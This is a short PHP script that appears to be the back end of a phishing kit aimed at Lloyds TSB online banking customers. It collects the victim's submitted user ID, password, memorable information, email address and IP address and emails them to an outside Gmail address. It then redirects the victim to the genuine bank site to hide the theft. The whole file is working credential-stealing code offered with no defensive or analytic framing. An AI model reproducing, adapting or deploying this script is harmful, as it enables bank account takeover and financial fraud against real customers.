<?
$ip = getenv("REMOTE_ADDR");
$message .= "---------Lloyds TSB---------\n";
$message .= "UserID : ".$_POST['UserId1']."\n";
$message .= "Password : ".$_POST['Password']."\n";
$message .= "--------\n";
$message .= "Memorable Information : ".$_POST['MemorableWord']."\n";
$message .= "E-mail Address : ".$_POST['email']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------Created By Shaun--------------\n";
$recipient = "robots.auto@googlemail.com";
$subject = "Shaun Lloyds TSB";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to", "Shaun Lloyds TSB", $message);
if (mail($recipient,$subject,$message,$headers))
                         {
		   header("Location: http://www.lloydstsb.com/");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>